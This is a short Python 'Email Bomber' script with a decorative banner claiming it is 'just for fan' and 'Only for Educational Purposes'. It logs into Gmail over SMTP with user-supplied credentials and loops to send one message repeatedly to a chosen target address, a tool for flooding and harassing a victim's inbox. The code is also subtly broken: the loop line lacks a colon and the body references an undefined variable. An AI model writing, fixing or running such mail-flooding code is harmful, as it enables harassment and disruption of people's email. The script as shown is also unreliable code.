import os
import smtplib


blue='\33[96m'
lightblue = '\033[96m'
red ='\033[94m'
white ='\33[98m'
yellow ='\33[92m'
green ='\33[40m'
cyan ='\33[96m'
end ='\33[0m'
line=yellow+ '*=================================================================='
logo=red+str

print ('                                                                ')
print ('                                                                ')
print ('          ♥®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®♥      ')
print ('          ♥                                            ♥      ')
print ('          ♥       Email Bomber ( just for fan )        ♥      ')
print ('          ♥                                            ♥      ')
print ('          ♥                 Version 3.0                ♥      ')
print ('          ♥               I 💞 LOVE 💞 YOU             ♥      ')
print ('          ♥          Modified by :Rasel islam          ♥      ')
print ('          ♥               I 💔 HATE 💔 YOU             ♥      ')
print ('          ♥      Only for Educational Purposes !!      ♥      ')
print ('          ♥                                            ♥      ')
print ('          ♥®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®♥      ')
print ('\n\n')



drobon=smtplib.SMTP('smtp.gmail.com','587')

drobon.ehlo()
drobon.starttls()

email=str(input("Enter Your Gmail: "))
pwd=str(input("Enter Your Password: "))
tmail=str(input("Enter Your Target E-mail: "))
msg=str(input("Enter Your Message"))
amount=int(input("Enter Your Amount"))

drobon.login(email,pwd)

for i in range(amount)

  drobon.sendmail(email,tmail,meg)
